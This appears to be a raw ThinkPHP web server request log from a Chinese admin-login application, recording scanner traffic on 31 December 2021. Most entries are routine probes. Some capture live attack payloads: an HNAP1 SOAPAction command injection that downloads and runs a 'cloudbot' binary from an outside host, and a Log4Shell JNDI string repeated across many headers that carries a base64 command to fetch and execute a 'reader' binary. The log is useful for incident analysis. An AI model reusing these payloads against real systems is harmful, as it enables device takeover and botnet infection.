---------------------------------------------------------------
[ 2021-12-31T01:50:29+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/
[运行时间：0.022049s] [吞吐率：45.35req/s] [内存消耗：488.97kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T01:50:29+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003209s] [吞吐率：311.64req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2021-12-31T03:58:58+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/
[运行时间：0.007486s] [吞吐率：133.58req/s] [内存消耗：489.88kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T03:59:00+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003371s] [吞吐率：296.65req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2021-12-31T04:03:51+08:00 ] 83.97.20.34 GET 113.91.251.87:8081/
[运行时间：0.003642s] [吞吐率：274.57req/s] [内存消耗：488.72kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.91.251.87:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T06:24:40+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/
[运行时间：0.003803s] [吞吐率：262.95req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T06:24:42+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.004130s] [吞吐率：242.14req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2021-12-31T07:34:01+08:00 ] 47.53.58.157 POST /HNAP1/
[运行时间：0.003824s] [吞吐率：261.51req/s] [内存消耗：494.17kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-type' => 'text/xml; charset="utf-8"',
  'soapaction' => 'http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://107.174.35.243/bins/mips.cloudbot && chmod +x mips.cloudbot;./mips.cloudbot`',
  'content-length' => '640',
)
[ info ] [ PARAM ] array (
  '/HNAP1/' => '',
  '<?xml_version' => '&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;AddPortMapping xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;PortMappingDescription&gt;foobar&lt;/PortMappingDescription&gt;&lt;InternalClient&gt;192.168.0.100&lt;/InternalClient&gt;&lt;PortMappingProtocol&gt;TCP&lt;/PortMappingProtocol&gt;&lt;ExternalPort&gt;1234&lt;/ExternalPort&gt;&lt;InternalPort&gt;1234&lt;/InternalPort&gt;&lt;/AddPortMapping&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;

',
)
---------------------------------------------------------------
[ 2021-12-31T08:01:44+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/
[运行时间：0.004841s] [吞吐率：206.57req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T08:01:45+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003667s] [吞吐率：272.69req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2021-12-31T09:58:43+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/
[运行时间：0.046708s] [吞吐率：21.41req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T09:58:43+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.015881s] [吞吐率：62.97req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2021-12-31T10:47:50+08:00 ] :: GET 113.91.251.87:8081/
[运行时间：0.004630s] [吞吐率：215.99req/s] [内存消耗：501.55kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'application/json, text/plain, */*',
  'x-api-version' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'user-agent' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'referer' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'cookie' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'authentication' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'bearer' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'cf-connecting_ip' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'x-forwarded-for' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'x-real-ip' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'x-client-ip' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'originating-ip' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'host' => '113.91.251.87:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T10:47:50+08:00 ] :: GET 113.91.251.87:8081/padmin/adminlogin/index.html
[运行时间：0.003912s] [吞吐率：255.63req/s] [内存消耗：498.13kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept' => 'application/json, text/plain, */*',
  'x-api-version' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'user-agent' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'referer' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'cookie' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'authentication' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'bearer' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'cf-connecting_ip' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'x-forwarded-for' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'x-real-ip' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'x-client-ip' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'originating-ip' => '${jndi${nagli:-:}ldap:${::-/}/2.58.149.206:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY3VybCAtTyBodHRwOi8vMi41OC4xNDkuMjA2L3JlYWRlcjsgY2htb2QgNzc3IHJlYWRlcjsgLi9yZWFkZXIgcnVubmVy}',
  'host' => '113.91.251.87:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2021-12-31T11:02:37+08:00 ] 60.191.125.35 HEAD 112.124.42.80:63435http://112.124.42.80:63435/
[运行时间：0.004167s] [吞吐率：239.98req/s] [内存消耗：491.63kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'bs_real_ip' => 'TmpBdU1Ua3hMakV5TlM0ek5RPT0=',
  'host' => '112.124.42.80:63435',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'proxy-connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T11:02:37+08:00 ] 60.191.125.35 GET 112.124.42.80:63435http://112.124.42.80:63435/padmin/adminlogin/index.html
[运行时间：0.002720s] [吞吐率：367.66req/s] [内存消耗：486.89kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'PHPSESSID=k5uloqtphvf7tt4f2i2sc7lqgf',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'bs_real_ip' => 'TmpBdU1Ua3hMakV5TlM0ek5RPT0=',
  'host' => '112.124.42.80:63435',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'proxy-connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2021-12-31T12:04:21+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/
[运行时间：0.004056s] [吞吐率：246.54req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T12:04:21+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003732s] [吞吐率：267.96req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2021-12-31T14:20:47+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/
[运行时间：0.003968s] [吞吐率：252.02req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T14:20:47+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.003967s] [吞吐率：252.08req/s] [内存消耗：485.70kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2021-12-31T14:48:05+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/
[运行时间：0.484570s] [吞吐率：2.06req/s] [内存消耗：758.97kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T14:48:06+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.009479s] [吞吐率：105.50req/s] [内存消耗：487.89kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2021-12-31T15:59:33+08:00 ] 83.97.20.34 GET 113.91.251.87:8081/
[运行时间：0.007717s] [吞吐率：129.58req/s] [内存消耗：489.62kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.91.251.87:8081',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T17:29:15+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/
[运行时间：0.009205s] [吞吐率：108.64req/s] [内存消耗：489.88kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2021-12-31T17:29:18+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/padmin/adminlogin/index.html
[运行时间：0.007919s] [吞吐率：126.28req/s] [内存消耗：486.59kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => 'azenv.net',
  'user-agent' => 'Go-http-client/1.1',
  'referer' => 'http://azenv.net/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2021-12-31T18:47:33+08:00 ] 92.118.234.202 GET azenv.nethttp://azenv.net/
[运行时间：0.003744s] [吞吐率：267.09req/s] [内存消耗：488.98kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
